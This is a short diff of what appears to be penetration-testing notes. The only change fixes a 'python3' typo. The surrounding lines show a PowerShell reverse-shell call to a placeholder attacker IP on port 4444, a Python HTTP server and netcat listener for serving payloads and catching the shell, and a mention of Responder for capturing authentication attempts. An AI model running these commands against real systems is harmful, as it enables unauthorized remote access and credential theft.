@@ -65,7 +65,7 @@ Invoke-PowershellTCP -reverse -IPAddress <attacker_ip> -Port 4444
 ```
 - Start a Python HTTP server and a listener:
 ```bash
-pyhton3 -m http.server 80
+python3 -m http.server 80
 nc -lvnp 4444
 ```
 - Run the responder service to capture authentication attempts 
